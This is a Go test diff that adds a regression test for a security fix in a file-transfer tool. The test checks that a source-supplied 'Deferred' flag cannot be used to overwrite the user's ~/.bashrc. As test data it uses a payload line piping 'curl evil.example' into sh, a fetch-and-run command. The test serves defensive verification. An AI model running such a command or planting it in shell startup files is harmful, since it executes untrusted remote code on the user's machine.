@@ -239,3 +239,52 @@ func TestDiffPropagatesNonENOENTStagedErrors(t *testing.T) {
 		t.Errorf("error must name the path %s: %v", staged, err)
 	}
 }
+
+// TestDiffHonoursDeferredOnlyForItsOwnCategories is the destination-side
+// half of the B1 security fix. Entry.Deferred arrives over the wire from
+// the SOURCE, and it makes Diff skip the Lstat of Dst entirely; a hostile
+// or buggy source could therefore mark an arbitrary destination path
+// (~/.bashrc) deferred, get staged-same back, and have Install overwrite
+// it. Deferred is meaningful for exactly three categories — the pane
+// capture (CatCapture) and existing-main git-attach's own index/worktree
+// entries (CatRepo/CatWorktree) — so for anything else the destination
+// must ignore the flag and compare against Dst as usual.
+func TestDiffHonoursDeferredOnlyForItsOwnCategories(t *testing.T) {
+	home := t.TempDir()
+	staging := filepath.Join(t.TempDir(), "staging")
+	if err := os.MkdirAll(staging, 0o700); err != nil {
+		t.Fatal(err)
+	}
+	bashrc := filepath.Join(home, ".bashrc")
+	writeFile(t, bashrc, "# the user's own shell rc\n")
+	payload := "curl evil.example | sh\n"
+
+	m := &Manifest{Version: 1, JobID: sid, SessionID: sid}
+	for i, cat := range []session.Category{session.CatPack, session.CatCapture, session.CatRepo, session.CatWorktree} {
+		m.Entries = append(m.Entries, Entry{
+			ID: i, Category: cat, Dst: bashrc, Size: int64(len(payload)),
+			Mode: 0o600, SHA256: sha(payload), Deferred: true,
+		})
+		writeFile(t, StagedPath(staging, i), payload)
+	}
+
+	st, err := Diff(context.Background(), m, staging)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if st[0] != PresentDifferent {
+		t.Errorf("deferred pack entry over an existing file = %s, want %s (Deferred must not be honoured for this category)", st[0], PresentDifferent)
+	}
+	for _, id := range []int{1, 2, 3} {
+		if st[id] != StagedSame {
+			t.Errorf("deferred %s entry = %s, want %s", m.Entries[id].Category, st[id], StagedSame)
+		}
+	}
+	blocking := Blocking(m, st, false)
+	if len(blocking) != 1 || blocking[0].ID != 0 {
+		t.Errorf("Blocking = %+v, want exactly the smuggled pack entry", blocking)
+	}
+	if got, _ := os.ReadFile(bashrc); string(got) != "# the user's own shell rc\n" {
+		t.Errorf("Diff must not touch %s; content = %q", bashrc, got)
+	}
+}
